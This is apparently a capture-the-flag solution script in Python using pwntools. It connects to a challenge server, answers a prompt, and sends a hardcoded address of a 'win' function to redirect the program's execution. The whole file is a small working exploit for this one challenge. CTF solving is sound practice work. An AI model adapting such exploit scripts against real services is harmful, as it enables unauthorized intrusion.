from pwn import remote


HOST = "w56ll430yihy.boroctf.com"
PORT = 47845
WIN = 0x5555555552D3


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"correctly.\n")
    io.sendline(b"hello")
    io.recvuntil(b"where do i go?\n")
    io.sendline(hex(WIN).encode())
    print(io.recvall(timeout=2).decode(errors="replace"), end="")


if __name__ == "__main__":
    main()
